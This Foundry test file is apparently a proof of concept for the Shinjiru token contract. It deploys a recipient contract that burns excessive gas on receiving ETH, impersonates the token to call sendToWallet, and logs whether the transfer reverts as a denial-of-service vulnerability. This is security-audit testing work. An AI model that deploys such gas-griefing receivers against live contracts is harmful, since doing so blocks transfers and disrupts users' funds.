// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Shinjiru.sol";

contract HighGasContract {
    uint256 public valueReceived;
    receive() external payable {
        // Consume excessive gas (over 2300) through repeated storage operations
        for (uint256 i = 0; i < 10000; i++) {
            valueReceived = msg.value;
        }
    }
}

contract MockUniswapV2Router {
    address public immutable factory;
    address public immutable WETH;
    
    constructor(address _factory) {
        factory = _factory;
        WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    }
}

contract MockUniswapV2Factory {
    function createPair(address, address) external pure returns (address) {
        return address(0x1234567890123456789012345678901234567890);
    }
}

contract ShinjiruGasTest is Test {
    Shinjiru token;
    HighGasContract highGas;
    address owner = 0x1ae66a7070BFABc33715A494B4F59aE1E82E3072;
    
    // BSC PancakeSwap router address
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Deploy mock factory and router - use actual deployments without constants
        MockUniswapV2Factory mockFactory = new MockUniswapV2Factory();
        MockUniswapV2Router mockRouter = new MockUniswapV2Router(address(mockFactory));
        
        // Setup mocks at required addresses via etches
        vm.etch(PANCAKE_ROUTER, address(mockRouter).code);
        vm.etch(mockRouter.factory(), address(mockFactory).code);

        // Impersonate owner for deployment
        vm.startPrank(owner);
        token = new Shinjiru();
        highGas = new HighGasContract(); // Deploy high-gas contract
        vm.stopPrank();
        
        // Fund contract with ETH
        vm.deal(address(token), 1 ether);
    }

    function testTransferToHighGasContractReverts() public {
        // Capture pre-trigger states
        console.log("--- BEFORE-Trigger State ---");
        uint256 tokenBalanceBefore = address(token).balance;
        uint256 highGasBalanceBefore = payable(address(highGas)).balance;
        console.log("Token contract balance: %s wei", tokenBalanceBefore);
        console.log("HighGas contract balance: %s wei", highGasBalanceBefore);
        
        console.log("--- Trigger Action: sendToWallet ---");
        // Impersonate Shinjiru contract to bypass visibility restrictions
        vm.startPrank(address(token));
        
        // Attempt to send 0.5 ETH to the high-gas contract
        (bool success,) = address(token).call(
            abi.encodeWithSignature(
                "sendToWallet(address,uint256)",
                payable(address(highGas)),
                0.5 ether
            )
        );
        vm.stopPrank();
        
        console.log("--- AFTER-Trigger State ---");
        // Capture post-trigger states
        uint256 tokenBalanceAfter = address(token).balance;
        uint256 highGasBalanceAfter = payable(address(highGas)).balance;
        console.log("Token contract balance: %s wei", tokenBalanceAfter);
        console.log("HighGas contract balance: %s wei", highGasBalanceAfter);
        
        // Verify state and transaction outcome
        bool stateUnchanged = (tokenBalanceAfter == tokenBalanceBefore) && 
                              (highGasBalanceAfter == highGasBalanceBefore);
        console.log("State unchanged: %s", stateUnchanged);
        console.log("Transaction success: %s", success);
        
        // Vulnerability validation logic
        if (!success && stateUnchanged) {
            console.log("Vulnerability Exploited: Transaction reverted & state unchanged as expected");
        } else {
            console.log("Vulnerability Not Exploited: Transfer or state change occurred");
        }
        
        // Print final verdict
        if (!success) {
            console.log("Vulnerability Exists: Transfer reverted due to excessive gas consumption by recipient contract");
        } else {
            console.log("Vulnerability not Exist: Transfer completed despite excessive gas consumption");
        }
    }
}